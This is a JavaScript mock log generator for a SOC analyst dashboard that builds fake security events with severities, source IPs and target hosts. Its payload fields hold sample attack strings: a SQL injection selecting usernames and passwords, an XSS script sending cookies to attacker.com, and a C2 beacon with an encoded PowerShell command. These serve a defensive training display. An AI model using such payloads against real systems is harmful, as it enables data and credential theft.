// Mock Log Generator for SOC Analyst Dashboard

export const SEVERITY = {
  LOW: 'LOW',         // Green: Normal operation / info
  MEDIUM: 'MEDIUM',   // Yellow: Warning / suspicious activity
  HIGH: 'HIGH',       // Red: Threat detected / attack attempt
  CRITICAL: 'CRITICAL'// Deep Red/Purple: Severe breach attempt / active attack
};

export const ATTACK_TYPES = {
  NORMAL: 'Normal Traffic',
  BRUTE_FORCE: 'SSH Brute Force',
  SQL_INJECTION: 'SQL Injection (SQLi)',
  XSS: 'Cross-Site Scripting (XSS)',
  DDOS: 'DDoS Flood',
  PORT_SCAN: 'Reconnaissance / Port Scan',
  MALWARE: 'C2 Malware Beacon',
  RANSOMWARE: 'Suspicious Mass File Access'
};

const SOURCE_IPS = [
  { ip: '192.168.1.105', country: 'Internal Network', city: 'DMZ' },
  { ip: '10.0.4.12', country: 'Internal Network', city: 'App Cluster' },
  { ip: '185.220.101.5', country: 'Germany', city: 'Frankfurt' },
  { ip: '45.142.214.12', country: 'Russia', city: 'Moscow' },
  { ip: '103.251.170.89', country: 'China', city: 'Beijing' },
  { ip: '198.51.100.44', country: 'United States', city: 'Ashburn' },
  { ip: '91.240.118.23', country: 'Netherlands', city: 'Amsterdam' },
  { ip: '178.62.204.11', country: 'United Kingdom', city: 'London' },
  { ip: '114.119.130.4', country: 'Singapore', city: 'Singapore' },
  { ip: '193.27.228.10', country: 'Romania', city: 'Bucharest' }
];

const TARGET_HOSTS = [
  'api.auth-service.internal',
  'db-primary.prod.vpc',
  'web-frontend-01',
  'k8s-ingress-gateway',
  'smb-share-finance',
  'dns-resolver-01',
  'vpn-gateway.corporate'
];

const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
  'sqlmap/1.7.2#stable (https://sqlmap.org)',
  'Nmap Scripting Engine (https://nmap.org/book/nse.html)',
  'Nikto/2.1.6',
  'Go-http-client/1.1',
  'curl/7.68.0'
];

export function getSeverityStyle(severity) {
  switch (severity) {
    case SEVERITY.LOW:
      return {
        bg: 'bg-emerald-950/40',
        text: 'text-emerald-400',
        border: 'border-emerald-500/30',
        badge: 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40',
        dot: 'bg-emerald-400'
      };
    case SEVERITY.MEDIUM:
      return {
        bg: 'bg-amber-950/40',
        text: 'text-amber-400',
        border: 'border-amber-500/30',
        badge: 'bg-amber-500/20 text-amber-300 border-amber-500/40',
        dot: 'bg-amber-400'
      };
    case SEVERITY.HIGH:
      return {
        bg: 'bg-rose-950/40',
        text: 'text-rose-400',
        border: 'border-rose-500/30',
        badge: 'bg-rose-500/20 text-rose-300 border-rose-500/40',
        dot: 'bg-rose-500'
      };
    case SEVERITY.CRITICAL:
      return {
        bg: 'bg-red-950/70',
        text: 'text-red-300',
        border: 'border-red-600/60',
        badge: 'bg-red-600/30 text-red-200 border-red-500/60 animate-pulse',
        dot: 'bg-red-500 animate-ping'
      };
    default:
      return {
        bg: 'bg-slate-900',
        text: 'text-slate-300',
        border: 'border-slate-700',
        badge: 'bg-slate-700 text-slate-300 border-slate-600',
        dot: 'bg-slate-400'
      };
  }
}

let logCounter = 1000;

export function generateLogEntry(forcedType = null) {
  logCounter++;
  const id = `LOG-${logCounter}`;
  const timestamp = new Date().toISOString();
  
  // Decide attack type based on forced parameter or probability
  let attackType = forcedType;
  if (!attackType) {
    const rand = Math.random();
    if (rand < 0.65) attackType = ATTACK_TYPES.NORMAL;
    else if (rand < 0.78) attackType = ATTACK_TYPES.BRUTE_FORCE;
    else if (rand < 0.86) attackType = ATTACK_TYPES.PORT_SCAN;
    else if (rand < 0.92) attackType = ATTACK_TYPES.SQL_INJECTION;
    else if (rand < 0.96) attackType = ATTACK_TYPES.XSS;
    else if (rand < 0.98) attackType = ATTACK_TYPES.DDOS;
    else attackType = ATTACK_TYPES.MALWARE;
  }

  const sourceObj = SOURCE_IPS[Math.floor(Math.random() * SOURCE_IPS.length)];
  const targetHost = TARGET_HOSTS[Math.floor(Math.random() * TARGET_HOSTS.length)];
  
  let severity = SEVERITY.LOW;
  let method = 'GET';
  let protocol = 'HTTPS';
  let statusCode = 200;
  let payload = '';
  let ruleTriggered = 'RULE-PASS-DEFAULT';
  let description = '';
  let userAgent = USER_AGENTS[0];

  switch (attackType) {
    case ATTACK_TYPES.NORMAL:
      severity = SEVERITY.LOW;
      method = Math.random() > 0.3 ? 'GET' : 'POST';
      statusCode = 200;
      payload = '/api/v1/user/profile?session_id=98321';
      ruleTriggered = 'RULE-ALLOW-STANDARD';
      description = 'Standard API endpoint request';
      break;

    case ATTACK_TYPES.BRUTE_FORCE:
      severity = SEVERITY.MEDIUM;
      method = 'POST';
      statusCode = 401;
      payload = `LOGIN_FAIL username="admin" password="***" attempts=${Math.floor(Math.random() * 20 + 5)}`;
      ruleTriggered = 'SEC-AUTH-BRUTEFORCE-01';
      description = 'Multiple failed authentication attempts detected from single IP';
      userAgent = USER_AGENTS[5]; // python/curl
      break;

    case ATTACK_TYPES.PORT_SCAN:
      severity = SEVERITY.MEDIUM;
      method = 'SYN';
      protocol = 'TCP';
      statusCode = 0;
      payload = `TCP_SYN scan target_ports=[21,22,80,443,3306,8080]`;
      ruleTriggered = 'SEC-RECON-PORTSCAN-03';
      description = 'Sequential TCP SYN probes across multiple port ranges';
      userAgent = USER_AGENTS[3]; // Nmap
      break;

    case ATTACK_TYPES.SQL_INJECTION:
      severity = SEVERITY.HIGH;
      method = 'GET';
      statusCode = 500;
      payload = `/products?category=electronics' UNION SELECT username, password FROM users --`;
      ruleTriggered = 'WAF-SQLI-DETECTION-09';
      description = 'SQL Syntax Injection pattern detected in query parameter';
      userAgent = USER_AGENTS[2]; // sqlmap
      break;

    case ATTACK_TYPES.XSS:
      severity = SEVERITY.HIGH;
      method = 'POST';
      statusCode = 400;
      payload = `<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>`;
      ruleTriggered = 'WAF-XSS-FILTER-04';
      description = 'Cross-Site Scripting inline payload reflected in form input';
      userAgent = USER_AGENTS[4]; // Nikto
      break;

    case ATTACK_TYPES.DDOS:
      severity = SEVERITY.CRITICAL;
      method = 'UDP/HTTP';
      protocol = 'UDP';
      statusCode = 503;
      payload = `HIGH_RATE_FLOOD ${Math.floor(Math.random() * 50000 + 10000)} req/sec bandwidth=1.2Gbps`;
      ruleTriggered = 'NET-DDOS-RATE-LIMIT-01';
      description = 'Abnormal traffic volumetric spike overwhelming ingress pool';
      break;

    case ATTACK_TYPES.MALWARE:
      severity = SEVERITY.CRITICAL;
      method = 'OUTBOUND';
      protocol = 'DNS/TCP';
      statusCode = 403;
      payload = `C2_BEACON query=cx8923.darknet-c2.org cmd="powershell -enc aW52b2tl..."`;
      ruleTriggered = 'EDR-MALWARE-BEACON-11';
      description = 'Host exhibiting C2 domain beaconing with encoded payload execution';
      break;

    case ATTACK_TYPES.RANSOMWARE:
      severity = SEVERITY.CRITICAL;
      method = 'SMB';
      protocol = 'SMB2';
      statusCode = 403;
      payload = `MASS_RENAME /shares/finance/*.docx -> *.locked count=${Math.floor(Math.random() * 500 + 100)}`;
      ruleTriggered = 'EDR-RANSOM-CANARY-02';
      description = 'Rapid high-frequency file modification & encryption canary trigger';
      break;

    default:
      severity = SEVERITY.LOW;
  }

  return {
    id,
    timestamp,
    severity,
    attackType,
    sourceIP: sourceObj.ip,
    geo: `${sourceObj.city}, ${sourceObj.country}`,
    targetHost,
    method,
    protocol,
    statusCode,
    payload,
    ruleTriggered,
    description,
    userAgent,
    acknowledged: false,
    escalated: false,
    blocked: false
  };
}

export function generateInitialLogs(count = 25) {
  const logs = [];
  for (let i = 0; i < count; i++) {
    const log = generateLogEntry();
    // stagger timestamps
    const pastTime = new Date(Date.now() - (count - i) * 3000).toISOString();
    log.timestamp = pastTime;
    logs.push(log);
  }
  return logs;
}
